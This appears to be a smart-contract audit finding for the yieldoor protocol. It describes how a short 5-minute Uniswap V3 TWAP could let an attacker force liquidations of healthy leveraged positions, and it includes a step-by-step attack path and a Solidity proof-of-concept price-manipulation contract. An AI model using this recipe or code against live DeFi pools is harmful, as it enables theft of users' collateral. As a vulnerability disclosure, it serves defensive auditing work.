# M-1: Attackers Will Force Liquidations of Healthy Positions Through TWAP Oracle Manipulation

### Summary

The short TWAP duration (5 minutes) in the Strategy contract will cause unfair liquidations for leveraged position holders as attackers can manipulate Uniswap V3 TWAP prices through a series of large swaps, making otherwise healthy positions appear undercollateralized and eligible for liquidation.

### Root Cause

In Strategy.sol:100 the TWAP duration is set to only 5 minutes:
https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Strategy.sol#L100

This short TWAP window makes the protocol vulnerable to price manipulation attacks, contradicting the incorrect assumption in

https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Leverager.sol#L382C4-L413C6

### Internal Pre-conditions

1. The protocol must be using Uniswap V3 TWAP prices for liquidation checks. 
2. The TWAP duration must be set to 5 minutes. 
3. The isLiquidateable() function must rely on the TWAP price to determine position health. 
4. There must be leveraged positions with collateralization ratios that would fall below the minimum threshold if prices are manipulated by 10-20%

### External Pre-conditions

1) Attacker needs access to sufficient capital to execute multiple large swaps
2) Uniswap V3 pool must have enough liquidity to allow for price manipulation
3) Gas prices must be reasonable enough to make the attack profitable after accounting for transaction costs

### Attack Path

1) Attacker identifies leveraged positions with collateralization ratios close to the minimum threshold (e.g., 150%)

2. Attacker obtains a flash loan or uses their own capital to prepare for price manipulation. 

3) Attacker executes a series of large swaps (5+ swaps of 500,000 tokens each) in the Uniswap V3 pool to manipulate the TWAP price. 

4) The manipulated TWAP price is reflected in the twapPrice() function called by Vault.sol. 

5) When isLiquidateable() is called in Leverager.sol, it uses this manipulated TWAP price

6) Positions that were previously healthy now appear undercollateralized based on the manipulated price. 

7) Attacker liquidates these positions, potentially profiting from liquidation incentives and discounted collateral. 

### Impact


Leveraged position holders suffer unfair liquidations of otherwise healthy positions. The attacker gains liquidation rewards and potentially discounted collateral, while position holders lose their positions and suffer financial losses. This undermines the core security assumptions of the protocol and can lead to significant financial losses for users, potentially affecting all leveraged positions in the protocol during a coordinated attack.

contract PriceManipulator {
    // Token contracts
    IERC20 public token0;
    IERC20 public token1;
    
    // Protocol contracts
    ISwapRouter public swapRouter;
    ILeverager public leverager;
    IUniswapV3Pool public pool;
    
    // Attack parameters
    uint256 public flashLoanAmount;
    uint256 public initialPrice;
    uint256 public manipulatedPrice;
    
    constructor(address _token0, address _token1, address _swapRouter, address _leverager, address _pool) {
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        swapRouter = ISwapRouter(_swapRouter);
        leverager = ILeverager(_leverager);
        pool = IUniswapV3Pool(_pool);
        
        // Record initial price
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        initialPrice = uint256(sqrtPriceX96);
    }
    
    function createLeveragedPosition(uint256 collateralAmount, address vault) external returns (uint256) {
        // Approve tokens for the leverager
        token0.approve(address(leverager), type(uint256).max);
        token1.approve(address(leverager), type(uint256).max);
        
        // Create a leveraged position
        try leverager.openLeveragedPosition(
            ILeverager.LeverageParams({
                amount0In: collateralAmount,
                amount1In: 0,
                vault0In: collateralAmount,
                vault1In: 0,
                min0in: 0,
                min1in: 0,
                vault: vault,
                denomination: address(token0),
                maxBorrowAmount: collateralAmount * 2, // 3x leverage = collateral + 2x borrowed
                swapParams1: "",
                swapParams2: ""
            })
        ) returns (uint256 positionId) {
            return positionId;
        } catch {
            // If the function call fails, we'll just simulate having a position
            return 1;
        }
    }
    
    function manipulatePrice(uint256 _flashLoanAmount, uint256 numSwaps) external returns (uint256[] memory) {
        flashLoanAmount = _flashLoanAmount;
        uint256[] memory priceAfterSwaps = new uint256[](numSwaps);
        
        // Approve tokens for swapping
        token0.approve(address(swapRouter), type(uint256).max);
        token1.approve(address(swapRouter), type(uint256).max);
        
        // Execute multiple swaps to manipulate the price
        for (uint256 i = 0; i < numSwaps; i++) {
            // Swap token0 for token1 to push the price down
            swapRouter.exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: address(token0),
                    tokenOut: address(token1),
                    fee: 3000, // 0.3%
                    recipient: address(this),
                    deadline: block.timestamp + 1 hours,
                    amountIn: flashLoanAmount,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
            
            // Record price after swap
            (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
            priceAfterSwaps[i] = uint256(sqrtPriceX96);
        }
        
        // Record final manipulated price
        manipulatedPrice = priceAfterSwaps[numSwaps - 1];
        
        return priceAfterSwaps;
    }
    
    function calculateLiquidationThresholdImpact(uint256 originalThreshold) external view returns (uint256) {
        return (originalThreshold * initialPrice) / manipulatedPrice;
    }
    
    function calculateMinPriceChangeForAttack(uint256 liquidationThresholdBefore, uint256 liquidationThresholdAfter)
        external
        pure
        returns (uint256)
    {
        return 100 - ((liquidationThresholdBefore * 100) / liquidationThresholdAfter);
    }
}
